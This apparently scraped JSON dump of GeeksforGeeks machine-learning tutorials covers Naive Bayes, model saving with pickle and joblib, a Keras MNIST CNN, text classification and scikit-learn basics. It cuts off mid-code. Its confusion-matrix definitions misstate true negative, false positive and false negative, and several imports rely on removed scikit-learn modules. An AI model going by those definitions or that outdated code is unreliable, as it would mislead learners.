sklearn.naive_bayes import GaussianNB\u00a0# initializing the classifiergnb = GaussianNB()\u00a0# training the classifiermodel = gnb.fit(train, train_labels)After the training is complete, we can use the trained model to make predictions on our test set that we have prepared before. To do that, we will use the built-in predict() function which returns an array of prediction values for data instance in the test set. We will then print our predictions using the print() function.\u00a0\u00a0Python3# making the predictionspredictions = gnb.predict(test)\u00a0# printing the predictionsprint(predictions)Output:\u00a0\u00a0[1 0 0 1 1 0 0 0 1 1 1 0 1 0 1 0 1 1 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 0\n 1 0 1 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 0 0 1 1 0 0 1 1 1 0 0 1 1 0 0 1 0\n 1 1 1 1 1 1 0 1 1 0 0 0 0 0 1 1 1 1 1 1 1 1 0 0 1 0 0 1 0 0 1 1 1 0 1 1 0\n 1 1 0 0 0 1 1 1 0 0 1 1 0 1 0 0 1 1 0 0 0 1 1 1 0 1 1 0 0 1 0 1 1 0 1 0 0\n 1 1 1 1 1 1 1 0 0 1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 0 1 1 0 1 1 1 1 1 1 0 0\n 0 1 1]From the output above, we see that the predict() function returned an array of 0s and 1s. These values represent the predicted values of the test set for the tumor class (malignant or benign).\u00a0\u00a0\u00a0Step #6: Evaluating the trained model\u2019s accuracy.As we have predicted values now, we can evaluate our model\u2019s accuracy by comparing it with the actual labels of the test set, i.e., comparing predictions with test_labels. For this purpose, we will be using the built-in accuracy_score() function in the sklearn module.\u00a0\u00a0Python3# importing the accuracy measuring functionfrom sklearn.metrics import accuracy_score\u00a0# evaluating the accuracyprint(accuracy_score(test_labels, predictions))Output:\u00a0\u00a00.9414893617021277So, we find out that this machine learning classifier based on the Naive Bayes algorithm is 94.15% accurate in predicting whether a tumor is malignant or benign.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5f18a502e9305916c15e9b70e4ca4efd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In machine learning, while working with scikit learn library, we need to save the trained models in a file and restore them in order to reuse it to compare the model with other models, to test the model on a new data. The saving of data is called Serialization, while restoring the data is called Deserialization.Also, we deal with different types and sizes of data. Some datasets are easily trained i.e- they take less time to train but the datasets whose size is large (more than 1GB) can take very large time to train on a local machine even with GPU. When we need the same trained data in some different project or later sometime, to avoid the wastage of the training time, store trained model so that it can be used anytime in the future.\u00a0There are two ways we can save a model in scikit learn:\u00a0Pickle string: The pickle module implements a fundamental, but powerful algorithm for serializing and de-serializing a Python object structure.\u00a0\u00a0Pickle model provides the following functions \u2013pickle.dump to serialize an object hierarchy, you simply use dump().\u00a0pickle.load to deserialize a data stream, you call the loads() function.Example: Let\u2019s apply K Nearest Neighbor on iris dataset and then save the model.\u00a0\u00a0Python3import numpy as np\u00a0# Load datasetfrom sklearn.datasets import load_irisiris = load_iris()\u00a0X = iris.datay = iris.target\u00a0# Split dataset into train and testX_train, X_test, y_train, y_test = \\\u00a0\u00a0\u00a0\u00a0train_test_split(X, y, test_size = 0.3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_state = 2018)\u00a0# import KNeighborsClassifier modelfrom sklearn.neighbors import KNeighborsClassifier as KNNknn = KNN(n_neighbors = 3)\u00a0# train modelknn.fit(X_train, y_train)\u00a0Save model to string using pickle \u2013\u00a0\u00a0Python3import pickle\u00a0# Save the trained model as a pickle string.saved_model = pickle.dumps(knn)\u00a0# Load the pickled modelknn_from_pickle = pickle.loads(saved_model)\u00a0# Use the loaded pickled model to make predictionsknn_from_pickle.predict(X_test)Output:\u00a0\u00a0\u00a0Pickled model as a file using joblib: Joblib is the replacement of pickle as it is more efficient on objects that carry large numpy arrays. These functions also accept file-like object instead of filenames.\u00a0joblib.dump to serialize an object hierarchy\u00a0joblib.load to deserialize a data streamSave to pickled file using joblib \u2013\u00a0\u00a0Python3from sklearn.externals import joblib\u00a0# Save the model as a pickle in a filejoblib.dump(knn, 'filename.pkl')\u00a0# Load the model from the fileknn_from_joblib = joblib.load('filename.pkl')\u00a0# Use the loaded model to make predictionsknn_from_joblib.predict(X_test)Output:\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a226785b6f0edf8f6a9f2adc317acc0c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "CNN is basically a model known to be Convolutional Neural Network and in recent times it has gained a lot of popularity because of its usefulness. CNN uses multilayer perceptrons to do computational works. CNN uses relatively little pre-processing compared to other image classification algorithms. This means the network learns through filters that in traditional algorithms were hand-engineered. So, for the image processing tasks CNNs are the best-suited option.MNIST dataset:\u00a0mnist dataset is a dataset of handwritten images as shown below in the image.\u00a0\u00a0We can get 99.06% accuracy by using CNN(Convolutional Neural Network) with a functional model. The reason for using a functional model is to maintain easiness while connecting the layers.\u00a0Firstly, include all necessary libraries\u00a0Python3import numpy as npimport kerasfrom keras.datasets import mnistfrom keras.models import Modelfrom keras.layers import Dense, Inputfrom keras.layers import Conv2D, MaxPooling2D, Dropout, Flattenfrom keras import backend as kCreate the train data and test dataTest data: Used for testing the model that how our model has been trained.\u00a0Train data: Used to train our model.\u00a0Python3(x_train, y_train), (x_test, y_test) = mnist.load_data()While proceeding further, img_rows and img_cols are used as the image dimensions. In mnist dataset, it is 28 and 28. We also need to check the data format i.e. \u2018channels_first\u2019 or \u2018channels_last\u2019. In CNN, we can normalize data before hands such that large terms of the calculations can be reduced to smaller terms. Like, we can normalize the x_train and x_test data by dividing it by 255.Checking data-format:\u00a0\u00a0Python3img_rows, img_cols=28, 28\u00a0if k.image_data_format() == 'channels_first':\u00a0\u00a0\u00a0x_train = x_train.reshape(x_train.shape[0], 1, img_rows, img_cols)\u00a0\u00a0\u00a0x_test = x_test.reshape(x_test.shape[0], 1, img_rows, img_cols)\u00a0\u00a0\u00a0inpx = (1, img_rows, img_cols)\u00a0else:\u00a0\u00a0\u00a0x_train = x_train.reshape(x_train.shape[0], img_rows, img_cols, 1)\u00a0\u00a0\u00a0x_test = x_test.reshape(x_test.shape[0], img_rows, img_cols, 1)\u00a0\u00a0\u00a0inpx = (img_rows, img_cols, 1)\u00a0x_train = x_train.astype('float32')x_test = x_test.astype('float32')x_train /= 255x_test /= 255Description of the output classes:Since the output of the model can comprise any of the digits between 0 to 9. so, we need 10 classes in output. To make output for 10 classes, use keras.utils.to_categorical function, which will provide the 10 columns. Out of these 10 columns, only one value will be one and the rest 9 will be zero and this one value of the output will denote the class of the digit.\u00a0Python3y_train = keras.utils.to_categorical(y_train)y_test = keras.utils.to_categorical(y_test)Now, the dataset is ready so let\u2019s move towards the CNN model :\u00a0\u00a0Python3inpx = Input(shape=inpx)layer1 = Conv2D(32, kernel_size=(3, 3), activation='relu')(inpx)layer2 = Conv2D(64, (3, 3), activation='relu')(layer1)layer3 = MaxPooling2D(pool_size=(3, 3))(layer2)layer4 = Dropout(0.5)(layer3)layer5 = Flatten()(layer4)layer6 = Dense(250, activation='sigmoid')(layer5)layer7 = Dense(10, activation='softmax')(layer6)Explanation of the working of each layer in the CNN model:layer1 is the Conv2d layer which convolves the image using 32 filters each of size (3*3).\u00a0layer2 is again a Conv2D layer which is also used to convolve the image and is using 64 filters each of size (3*3).\u00a0layer3 is the MaxPooling2D layer which picks the max value out of a matrix of size (3*3).\u00a0layer4 is showing Dropout at a rate of 0.5.\u00a0layer5 is flattening the output obtained from layer4 and this flattens output is passed to layer6.\u00a0layer6 is a hidden layer of a neural network containing 250 neurons.\u00a0layer7 is the output layer having 10 neurons for 10 classes of output that is using the softmax function.Calling compile and fit function:\u00a0\u00a0Python3model = Model([inpx], layer7)model.compile(optimizer=keras.optimizers.Adadelta(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0loss=keras.losses.categorical_crossentropy,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0metrics=['accuracy'])\u00a0model.fit(x_train, y_train, epochs=12, batch_size=500)\u00a0Firstly, we made an object of the model as shown in the above-given lines, where [inpx] is the input in the model and layer7 is the output of the model. We compiled the model using the required optimizer, loss function and printed the accuracy and at the last model.fit was called along with parameters like x_train(means image vectors), y_train(means the label), number of epochs, and the batch size. Using fit function x_train, y_train dataset is fed to model in particular batch size.Evaluate function:\u00a0model.evaluate provides the score for the test data i.e. provided the test data to the model. Now, the model will predict the class of the data, and the predicted class will be matched with the y_test label to give us the accuracy.\u00a0\u00a0Python3score = model.evaluate(x_test, y_test, verbose=0)print('loss=', score[0])print('accuracy=', score[1])Output:\u00a0\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "bb88765ecabe54961442e8ba4d0c689c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Natural language processing (NLP) is an area of computer science and artificial intelligence concerned with the interactions between computers and human (natural) languages, in particular how to program computers to process and analyze large amounts of natural language data. It is the branch of machine learning which is about analyzing any text and handling predictive analysis.Scikit-learn is a free software machine learning library for the Python programming language. Scikit-learn is largely written in Python, with some core algorithms written in Cython to achieve performance. Cython is a superset of the Python programming language, designed to give C-like performance with code that is written mostly in Python.Let\u2019s understand the various steps involved in text processing and the flow of NLP.\u00a0This algorithm can be easily applied to any other kind of text like classify a book into Romance, Friction, but for now, let\u2019s use a restaurant review dataset to review negative or positive feedback.\u00a0Steps involved:Step 1: Import dataset with setting delimiter as \u2018\\t\u2019 as columns are separated as tab space. Reviews and their category(0 or 1) are not separated by any other symbol but with tab space as most of the other symbols are is the review (like $ for the price, \u2026.!, etc) and the algorithm might use them as a delimiter, which will lead to strange behavior (like errors, weird output) in output.\u00a0\u00a0Python3# Importing Librariesimport numpy as np\u00a0import pandas as pd\u00a0# Import datasetdataset = pd.read_csv('Restaurant_Reviews.tsv', delimiter = '\\t')To download the Restaurant_Reviews.tsv dataset used, click here.Step 2: Text Cleaning or Preprocessing\u00a0\u00a0Remove Punctuations, Numbers: Punctuations, Numbers don\u2019t help much in processing the given text, if included, they will just increase the size of a bag of words that we will create as the last step and decrease the efficiency of an algorithm.Stemming: Take roots of the word\u00a0\u00a0Convert each word into its lower case: For example, it is useless to have some words in different cases (eg \u2018good\u2019 and \u2018GOOD\u2019).\u00a0Python3# library to clean dataimport re\u00a0# Natural Language Tool Kitimport nltk\u00a0nltk.download('stopwords')\u00a0# to remove stopwordfrom nltk.corpus import stopwords\u00a0# for Stemming proposefrom nltk.stem.porter import PorterStemmer\u00a0# Initialize empty array# to append clean textcorpus = []\u00a0# 1000 (reviews) rows to cleanfor i in range(0, 1000):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# column : \"Review\", row ith\u00a0\u00a0\u00a0\u00a0review = re.sub('[^a-zA-Z]', ' ', dataset['Review'][i])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# convert all cases to lower cases\u00a0\u00a0\u00a0\u00a0review = review.lower()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# split to array(default delimiter is \" \")\u00a0\u00a0\u00a0\u00a0review = review.split()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# creating PorterStemmer object to\u00a0\u00a0\u00a0\u00a0# take main stem of each word\u00a0\u00a0\u00a0\u00a0ps = PorterStemmer()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# loop for stemming each word\u00a0\u00a0\u00a0\u00a0# in string array at ith row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0review = [ps.stem(word) for word in review\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if not word in set(stopwords.words('english'))]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# rejoin all string array elements\u00a0\u00a0\u00a0\u00a0# to create back into a string\u00a0\u00a0\u00a0\u00a0review = ' '.join(review)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# append each string to create\u00a0\u00a0\u00a0\u00a0# array of clean text\u00a0\u00a0\u00a0\u00a0corpus.append(review)Examples: Before and after applying above code (reviews = > before, corpus => after)\u00a0Step 3: Tokenization, involves splitting sentences and words from the body of the text.Step 4: Making the bag of words via sparse matrix\u00a0Take all the different words of reviews in the dataset without repeating of words.One column for each word, therefore there is going to be many columns.Rows are reviewsIf a word is there in the row of a dataset of reviews, then the count of the word will be there in the row of a bag of words under the column of the word.Examples: Let\u2019s take a dataset of reviews of only two reviews\u00a0\u00a0Input : \"dam good steak\", \"good food good service\"\nOutput :\n \u00a0For this purpose we need CountVectorizer class from sklearn.feature_extraction.text.\u00a0We can also set a max number of features (max no. features which help the most via attribute \u201cmax_features\u201d). Do the training on the corpus and then apply the same transformation to the corpus \u201c.fit_transform(corpus)\u201d and then convert it into an array. If the review is positive or negative that answer is in the second column of the dataset[:, 1]: all rows and 1st column (indexing from zero).\u00a0Python3# Creating the Bag of Words modelfrom sklearn.feature_extraction.text import CountVectorizer\u00a0# To extract max 1500 feature.# \"max_features\" is attribute to# experiment with to get better resultscv = CountVectorizer(max_features = 1500)\u00a0# X contains corpus (dependent variable)X = cv.fit_transform(corpus).toarray()\u00a0# y contains answers if review# is positive or negativey = dataset.iloc[:, 1].valuesDescription of the dataset to be used:\u00a0Columns separated by \\t (tab space)First column is about reviews of peopleIn second column, 0 is for negative review and 1 is for positive reviewStep 5: Splitting Corpus into Training and Test set. For this, we need class train_test_split from sklearn.cross_validation. Split can be made 70/30 or 80/20 or 85/15 or 75/25, here I choose 75/25 via \u201ctest_size\u201d.\u00a0X is the bag of words, y is 0 or 1 (positive or negative).\u00a0Python3# Splitting the dataset into# the Training set and Test setfrom sklearn.cross_validation import train_test_split\u00a0# experiment with \"test_size\"# to get better resultsX_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.25)Step 6: Fitting a Predictive Model (here random forest)\u00a0\u00a0Since Random forest is an ensemble model (made of many trees) from sklearn.ensemble, import RandomForestClassifier classWith 501 trees or \u201cn_estimators\u201d and criterion as \u2018entropy\u2019Fit the model via .fit() method with attributes X_train and y_train\u00a0Python3# Fitting Random Forest Classification# to the Training setfrom sklearn.ensemble import RandomForestClassifier\u00a0# n_estimators can be said as number of# trees, experiment with n_estimators# to get better resultsmodel = RandomForestClassifier(n_estimators = 501,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0criterion = 'entropy')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0model.fit(X_train, y_train)Step 7: Predicting Final Results via using .predict() method with attribute X_test\u00a0\u00a0Python3# Predicting the Test set resultsy_pred = model.predict(X_test)\u00a0y_predNote: Accuracy with the random forest was 72%.(It may be different when performed an experiment with different test sizes, here = 0.25).Step 8: To know the accuracy, a confusion matrix is needed.Confusion Matrix is a 2X2 Matrix.\u00a0TRUE POSITIVE : measures the proportion of actual positives that are correctly identified.\u00a0TRUE NEGATIVE : measures the proportion of actual positives that are not correctly identified.\u00a0FALSE POSITIVE : measures the proportion of actual negatives that are correctly identified.\u00a0FALSE NEGATIVE : measures the proportion of actual negatives that are not correctly identified.Note: True or False refers to the assigned classification being Correct or Incorrect, while Positive or Negative refers to assignment to the Positive or the Negative Category\u00a0\u00a0\u00a0Python3# Making the Confusion Matrixfrom sklearn.metrics import confusion_matrix\u00a0cm = confusion_matrix(y_test, y_pred)\u00a0cmMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "61d0cf6492f36497fd2b9136de22f760",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Pre-requisite: Getting started with machine learning\u00a0scikit-learn is an open-source Python library that implements a range of machine learning, pre-processing, cross-validation, and visualization algorithms using a unified interface.Important features of scikit-learn:\u00a0Simple and efficient tools for data mining and data analysis. It features various classification, regression and clustering algorithms including support vector machines, random forests, gradient boosting, k-means, etc.Accessible to everybody and reusable in various contexts.Built on the top of NumPy, SciPy, and matplotlib.Open source, commercially usable \u2013 BSD license.In this article, we are going to see how we can easily build a machine learning model using scikit-learn.\u00a0Installation:Scikit-learn requires:\u00a0\u00a0NumPySciPy as its dependencies.Before installing scikit-learn, ensure that you have NumPy and SciPy installed. Once you have a working installation of NumPy and SciPy, the easiest way to install scikit-learn is using pip:\u00a0pip install -U scikit-learnLet us get started with the modeling process now.Step 1: Load a datasetA dataset is nothing but a collection of data. A dataset generally has two main components:\u00a0Features: (also known as predictors, inputs, or attributes) they are simply the variables of our data. They can be more than one and hence represented by a feature matrix (\u2018X\u2019 is a common notation to represent feature matrix). A list of all the feature names is termed feature names.Response: (also known as the target, label, or output) This is the output variable depending on the feature variables. We generally have a single response column and it is represented by a response vector (\u2018y\u2019 is a common notation to represent response vector). All the possible values taken by a response vector are termed target names.Loading exemplar dataset: scikit-learn comes loaded with a few example datasets like the iris and digits datasets for classification and the boston house prices dataset for regression.\u00a0Given below is an example of how one can load an exemplar dataset:\u00a0Python# load the iris dataset as an examplefrom sklearn.datasets import load_irisiris = load_iris()\u00a0\u00a0\u00a0# store the feature matrix (X) and response vector (y)X = iris.datay = iris.target\u00a0\u00a0\u00a0# store the feature and target namesfeature_names = iris.feature_namestarget_names = iris.target_names\u00a0\u00a0\u00a0# printing features and target names of our datasetprint(\"Feature names:\", feature_names)print(\"Target names:\", target_names)\u00a0\u00a0\u00a0# X and y are numpy arraysprint(\"\\nType of X is:\", type(X))\u00a0\u00a0\u00a0# printing first 5 input rowsprint(\"\\nFirst 5 rows of X:\\n\", X[:5])Output:\u00a0Feature names: ['sepal length (cm)','sepal width (cm)',\n                'petal length (cm)','petal width (cm)']\nTarget names: ['setosa' 'versicolor' 'virginica']\n\nType of X is: \n\nFirst 5 rows of X:\n [[ 5.1  3.5  1.4  0.2]\n [ 4.9  3.   1.4  0.2]\n [ 4.7  3.2  1.3  0.2]\n [ 4.6  3.1  1.5  0.2]\n [ 5.   3.6  1.4  0.2]]Loading external dataset: Now, consider the case when we want to load an external dataset. For this purpose, we can use the pandas library for easily loading and manipulating datasets.To install pandas, use the following pip command:\u00a0\u00a0pip install pandasIn pandas, important data types are:Series: Series is a one-dimensional labeled array capable of holding any data type.DataFrame: It is a 2-dimensional labeled data structure with columns of potentially different types. You can think of it like a spreadsheet or SQL table, or a dict of Series objects. It is generally the most commonly used pandas object.Note: The CSV file used in the example below can be downloaded from here: weather.csvPythonimport pandas as pd\u00a0\u00a0\u00a0# reading csv filedata = pd.read_csv('weather.csv')\u00a0\u00a0\u00a0# shape of datasetprint(\"Shape:\", data.shape)\u00a0\u00a0\u00a0# column namesprint(\"\\nFeatures:\", data.columns)\u00a0\u00a0\u00a0# storing the feature matrix (X) and response vector (y)X = data[data.columns[:-1]]y = data[data.columns[-1]]\u00a0\u00a0\u00a0# printing first 5 rows of feature matrixprint(\"\\nFeature matrix:\\n\", X.head())\u00a0\u00a0\u00a0# printing first 5 values of response vectorprint(\"\\nResponse vector:\\n\", y.head())Output:\u00a0Shape: (14, 5)\n\nFeatures: Index([u'Outlook', u'Temperature', u'Humidity', \n                u'Windy', u'Play'], dtype='object')\n\nFeature matrix:\n     Outlook Temperature Humidity  Windy\n0  overcast         hot     high  False\n1  overcast        cool   normal   True\n2  overcast        mild     high   True\n3  overcast         hot   normal  False\n4     rainy        mild     high  False\n\nResponse vector:\n0    yes\n1    yes\n2    yes\n3    yes\n4    yes\nName: Play, dtype: objectStep 2: Splitting the datasetOne important aspect of all machine learning models is to determine their accuracy. Now, in order to determine their accuracy, one can train the model using the given dataset and then predict the response values for the same dataset using that model and hence, find the accuracy of the model.\u00a0But this method has several flaws in it, like:\u00a0The goal is to estimate the likely performance of a model on out-of-sample data.Maximizing training accuracy rewards overly complex models that won\u2019t necessarily generalize our model.Unnecessarily complex models may over-fit the training data.A better option is to split our data into two parts: the first one for training our machine learning model, and the second one for testing our model.\u00a0To summarize:\u00a0\u00a0Split the dataset into two pieces: a training set and a testing set.Train the model on the training set.Test the model on the testing set, and evaluate how well our model did.Advantages of train/test split:\u00a0\u00a0The model can be trained and tested on different data than the one used for training.Response values are known for the test dataset, hence predictions can be evaluatedTesting accuracy is a better estimate than training accuracy of out-of-sample performance.Consider the example below:\u00a0Python# load the iris dataset as an examplefrom sklearn.datasets import load_irisiris = load_iris()\u00a0# store the feature matrix (X) and response vector (y)X = iris.datay = iris.target\u00a0# splitting X and y into training and testing setsfrom sklearn.model_selection import train_test_splitX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4, random_state=1)\u00a0# printing the shapes of the new X objectsprint(X_train.shape)print(X_test.shape)\u00a0# printing the shapes of the new y objectsprint(y_train.shape)print(y_test.shape)Output:\u00a0(90L, 4L)\n(60L, 4L)\n(90L,)\n(60L,)The train_test_split function takes several arguments which are explained below:\u00a0\u00a0X, y: These are the feature matrix and response vector which need to be split.test_size: It is the ratio of test data to the given data. For example, setting test_size = 0.4 for 150 rows of X produces test data of 150 x 0.4 = 60 rows.random_state: If you use random_state = some_number, then you can guarantee that your split will be always the same. This is useful if you want reproducible results, for example in testing for consistency in the documentation (so that everybody can see the same numbers).Step 3: Training the modelNow, it\u2019s time to train some prediction models using our dataset. Scikit-learn provides a wide range of machine learning algorithms that have a unified/consistent interface for fitting, predicting accuracy, etc.The example given below uses KNN (K nearest neighbors) classifier.Note: We will not go into the details of how the algorithm works as we are interested in understanding its implementation only.\u00a0Now, consider the example below:\u00a0Python# load the iris dataset as an examplefrom sklearn.datasets import load_irisiris = load_iris()\u00a0# store the feature matrix (X) and response vector (y)X = iris.datay = iris.target\u00a0# splitting X and y into training and testing setsfrom sklearn.model_selection import train_test_splitX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4, random_state=1)\u00a0# training the model on training setfrom sklearn.neighbors import KNeighborsClassifierknn = KNeighborsClassifier(n_neighbors=3)knn.fit(X_train, y_train)\u00a0# making predictions on the testing sety_pred = knn.predict(X_test)\u00a0# comparing actual response values (y_test) with predicted response values (y_pred)from sklearn import metricsprint(\"kNN model accuracy:\", metrics.accuracy_score(y_test, y_pred))\u00a0# making prediction for out of sample datasample = [[3, 5, 4, 2], [2, 3, 5, 4]]preds = knn.predict(sample)pred_species = [iris.target_names[p] for p in preds]print(\"Predictions:\", pred_species)\u00a0# saving the modelfrom sklearn.externals import joblibjoblib.dump(knn, 'iris_knn.pkl')Output:\u00a0kNN model accuracy: 0.983333333333\nPredictions: ['versicolor', 'virginica']Important points to note from the above code:\u00a0\u00a0We create a knn classifier object using:\u00a0\u00a0knn = KNeighborsClassifier(n_neighbors=3)The classifier is trained using X_train data. The process is termed fitting. We pass the feature matrix and the corresponding response vector.\u00a0\u00a0knn.fit(X_train, y_train)Now, we need to test our classifier on the X_test data. knn.predict method is used for this purpose. It returns the predicted response vector, y_pred.\u00a0\u00a0y_pred = knn.predict(X_test)Now, we are interested in finding the accuracy of our model by comparing y_test and y_pred. This is done using the metrics module\u2019s method accuracy_score:\u00a0print(metrics.accuracy_score(y_test, y_pred))Consider the case when you want your model to make predictions out of sample data. Then, the sample input can simply be passed in the same way as we pass any feature matrix.\u00a0sample = [[3, 5, 4, 2], [2, 3, 5, 4]]\npreds = knn.predict(sample)If you are not interested in training your classifier again and again and using the pre-trained classifier, one can save their classifier using joblib. All you need to do is:\u00a0joblib.dump(knn, 'iris_knn.pkl')In case you want to load an already saved classifier, use the following method:\u00a0knn = joblib.load('iris_knn.pkl')\u00a0As we approach the end of this article, here are some benefits of using scikit-learn over some other machine learning libraries(like R libraries):\u00a0\u00a0Consistent interface to machine learning modelsProvides many tuning parameters but with sensible defaultsExceptional documentationRich set of functionality for companion tasks.Active community for development and support.References:\u00a0\u00a0http://scikit-learn.org/stable/documentation.htmlhttps://github.com/justmarkham/scikit-learn-videosThis article is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "15a07c7079191ad3dc7f2822a07afa7a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "An Artificial Neural Network (ANN) is an information processing paradigm that is inspired the brain. ANNs, like people, learn by example. An ANN is configured for a specific application, such as pattern recognition or data classification, through a learning process. Learning largely involves adjustments to the synaptic connections that exist between the neurons.\u00a0\u00a0\u00a0The brain consists of hundreds of billions of cells called neurons. These neurons are connected together by synapses which are nothing but the connections across which a neuron can send an impulse to another neuron. When a neuron sends an excitatory signal to another neuron, then this signal will be added to all of the other inputs of that neuron. If it exceeds a given threshold then it will cause the target neuron to fire an action signal forward \u2014 this is how the thinking process works internally.In Computer Science, we model this process by creating \u201cnetworks\u201d on a computer using matrices. These networks can be understood as an abstraction of neurons without all the biological complexities taken into account. To keep things simple, we will just model a simple NN, with two layers capable of solving a linear classification problem.\u00a0Let\u2019s say we have a problem where we want to predict output given a set of inputs and outputs as training example like so:Note that the output is directly related to the third column i.e. the values of input 3 is what the output is in every training example in fig. 2. So for the test example output value should be 1.\u00a0The training process consists of the following steps:\u00a0Forward Propagation:\u00a0Take the inputs, multiply by the weights (just use random numbers as weights)\u00a0Let Y = WiIi\u00a0= W1I1+W2I2+W3I3\u00a0Pass the result through a sigmoid formula to calculate the neuron\u2019s output. The Sigmoid function is used to normalize the result between 0 and 1:\u00a01/1 + e-yBack Propagation\u00a0Calculate the error i.e the difference between the actual output and the expected output. Depending on the error, adjust the weights by multiplying the error with the input and again with the gradient of the Sigmoid curve:\u00a0Weight += Error Input Output (1-Output)\u00a0,here Output (1-Output) is derivative of sigmoid curve.Note: Repeat the whole process for a few thousand iterations.Let\u2019s code up the whole process in Python. We\u2019ll be using the Numpy library to help us with all the calculations on matrices easily. You\u2019d need to install a numpy library on your system to run the code\u00a0Command to install numpy:\u00a0 sudo apt -get install python-numpyImplementation:Python3from joblib.numpy_pickle_utils import xrangefrom numpy import *\u00a0\u00a0class NeuralNet(object):\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Generate random numbers\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random.seed(1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Assign random weights to a 3 x 1 matrix,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.synaptic_weights = 2 * random.random((3, 1)) - 1\u00a0\u00a0\u00a0\u00a0\u00a0# The Sigmoid function\u00a0\u00a0\u00a0\u00a0def __sigmoid(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1 / (1 + exp(-x))\u00a0\u00a0\u00a0\u00a0\u00a0# The derivative of the Sigmoid function.\u00a0\u00a0\u00a0\u00a0# This is the gradient of the Sigmoid curve.\u00a0\u00a0\u00a0\u00a0def __sigmoid_derivative(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x * (1 - x)\u00a0\u00a0\u00a0\u00a0\u00a0# Train the neural network and adjust the weights each time.\u00a0\u00a0\u00a0\u00a0def train(self, inputs, outputs, training_iterations):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for iteration in xrange(training_iterations):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Pass the training set through the 